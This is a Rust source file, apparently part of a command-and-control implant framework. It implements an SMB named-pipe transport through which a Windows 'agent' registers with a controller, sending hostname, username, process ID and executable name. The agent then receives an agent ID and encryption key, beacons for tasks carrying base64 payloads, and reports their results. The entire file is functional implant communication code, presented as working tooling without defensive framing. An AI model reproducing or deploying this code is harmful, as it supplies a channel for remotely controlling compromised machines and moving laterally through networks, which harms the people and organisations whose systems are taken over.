//! SMB named-pipe transport.
//!
//! Wire protocol: [4-byte LE length][JSON payload] — plain (no AES).
//! Registration: {"type":"REGISTER","hostname":...} → {"agent_id":"...","aes_key":"..."}
//! Beacon:       {"type":"BEACON","agent_id":"..."}  → JSON array of tasks or null
//! Result:       {"type":"RESULT","task_id":N,"output":"...","error":"...","agent_id":"..."}

use core::ptr;
use windows_sys::Win32::Foundation::{CloseHandle, GENERIC_READ, GENERIC_WRITE,
    INVALID_HANDLE_VALUE};
use crate::transport::wstr;

const OPEN_EXISTING:       u32 = 3;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;

// Raw pipe I/O — avoids windows-sys feature-path issues (see dotnet.rs pattern)
extern "system" {
    fn CreateFileW(lpFileName: *const u16, dwDesiredAccess: u32, dwShareMode: u32,
                   lpSecurityAttributes: *const core::ffi::c_void,
                   dwCreationDisposition: u32, dwFlagsAndAttributes: u32,
                   hTemplateFile: isize) -> isize;
    fn ReadFile(hFile: isize, lpBuffer: *mut u8, nNumberOfBytesToRead: u32,
                lpNumberOfBytesRead: *mut u32, lpOverlapped: *const core::ffi::c_void) -> i32;
    fn WriteFile(hFile: isize, lpBuffer: *const u8, nNumberOfBytesToWrite: u32,
                 lpNumberOfBytesWritten: *mut u32, lpOverlapped: *const core::ffi::c_void) -> i32;
    fn WaitNamedPipeW(lpNamedPipeName: *const u16, nTimeOut: u32) -> i32;
}

use base64::{engine::general_purpose::STANDARD, Engine as _};

pub type PipeHandle = isize; // HANDLE

pub fn open_pipe(pipe_name: &str) -> PipeHandle {
    let full = if pipe_name.starts_with("\\\\") {
        pipe_name.to_string()
    } else {
        format!(r"\\.\pipe\{}", pipe_name)
    };
    let full_w = wstr(&full);
    unsafe {
        let w_full = wstr(&full);
        // Wait up to 5 seconds for the pipe to be available
        WaitNamedPipeW(w_full.as_ptr(), 5000);
        CreateFileW(
            full_w.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0,
        )
    }
}

pub fn close_pipe(h: PipeHandle) {
    if h != INVALID_HANDLE_VALUE && h != 0 {
        unsafe { CloseHandle(h); }
    }
}

fn pipe_read_exact(h: PipeHandle, buf: &mut [u8]) -> bool {
    let mut offset = 0;
    while offset < buf.len() {
        let mut got: u32 = 0;
        let ok = unsafe {
            ReadFile(h, buf.as_mut_ptr().add(offset), (buf.len() - offset) as u32, &mut got, ptr::null_mut())
        };
        if ok == 0 || got == 0 { return false; }
        offset += got as usize;
    }
    true
}

fn pipe_write_all(h: PipeHandle, data: &[u8]) -> bool {
    let mut offset = 0;
    while offset < data.len() {
        let mut wrote: u32 = 0;
        let ok = unsafe {
            WriteFile(h, data.as_ptr().add(offset), (data.len() - offset) as u32, &mut wrote, ptr::null_mut())
        };
        if ok == 0 || wrote == 0 { return false; }
        offset += wrote as usize;
    }
    true
}

pub fn pipe_read_msg(h: PipeHandle) -> Option<Vec<u8>> {
    let mut hdr = [0u8; 4];
    if !pipe_read_exact(h, &mut hdr) { return None; }
    let len = u32::from_le_bytes(hdr) as usize;
    if len == 0 || len > 10 * 1024 * 1024 { return None; }
    let mut data = vec![0u8; len];
    if !pipe_read_exact(h, &mut data) { return None; }
    Some(data)
}

pub fn pipe_write_msg(h: PipeHandle, data: &[u8]) -> bool {
    let hdr = (data.len() as u32).to_le_bytes();
    pipe_write_all(h, &hdr) && pipe_write_all(h, data)
}

// ── Transport operations ──────────────────────────────────────────────────────

pub fn register(h: PipeHandle) -> Option<(String, Vec<u8>)> {
    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    let username = std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    let pid      = std::process::id();

    let exe = std::env::current_exe()
        .ok()
        .and_then(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
        .unwrap_or_else(|| "agent.exe".to_string());

    let req = serde_json::json!({
        "type":         "REGISTER",
        "hostname":     hostname,
        "username":     username,
        "os":           "windows/amd64",
        "pid":          pid,
        "process_name": exe,
        "is_admin":     false,
        "language":     "rust",
    }).to_string();

    if !pipe_write_msg(h, req.as_bytes()) { return None; }
    let resp_bytes = pipe_read_msg(h)?;
    let resp: serde_json::Value = serde_json::from_slice(&resp_bytes).ok()?;
    let agent_id  = resp["agent_id"].as_str()?.to_string();
    let aes_key_b64 = resp["aes_key"].as_str().unwrap_or("");
    let aes_key = if aes_key_b64.is_empty() {
        Vec::new()
    } else {
        base64::engine::general_purpose::STANDARD.decode(aes_key_b64).unwrap_or_default()
    };
    Some((agent_id, aes_key))
}

pub fn beacon(h: PipeHandle, agent_id: &str) -> Option<Vec<u8>> {
    let req = serde_json::json!({
        "type":     "BEACON",
        "agent_id": agent_id,
    }).to_string();
    if !pipe_write_msg(h, req.as_bytes()) { return None; }
    let resp = pipe_read_msg(h)?;
    if resp.is_empty() || resp == b"null" { return None; }
    Some(resp)
}

pub fn send_result(h: PipeHandle, agent_id: &str, task_id: i64, output: &str, error: &str, is_admin: bool) -> bool {
    let req = serde_json::json!({
        "type":     "RESULT",
        "task_id":  task_id,
        "output":   output,
        "error":    error,
        "agent_id": agent_id,
        "is_admin": is_admin,
    }).to_string();
    pipe_write_msg(h, req.as_bytes())
}

/// Parse SMB beacon response — JSON array directly (not wrapped in {"tasks":[...]}).
pub fn parse_smb_tasks(resp: &[u8]) -> Vec<super::transport::TaskWire> {
    use base64::Engine;
    let arr: serde_json::Value = match serde_json::from_slice(resp) {
        Ok(v) => v,
        Err(_) => return vec![],
    };
    let arr = match arr.as_array() {
        Some(a) => a,
        None    => return vec![],
    };
    arr.iter().map(|t| super::transport::TaskWire {
        id:      t["id"].as_i64().unwrap_or(0),
        typ:     t["type"].as_str().unwrap_or("").to_string(),
        args:    t.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string(),
        payload: t.get("payload")
                  .and_then(|v| v.as_str())
                  .filter(|s| !s.is_empty())
                  .and_then(|s| base64::engine::general_purpose::STANDARD.decode(s).ok())
                  .unwrap_or_default(),
    }).collect()
}
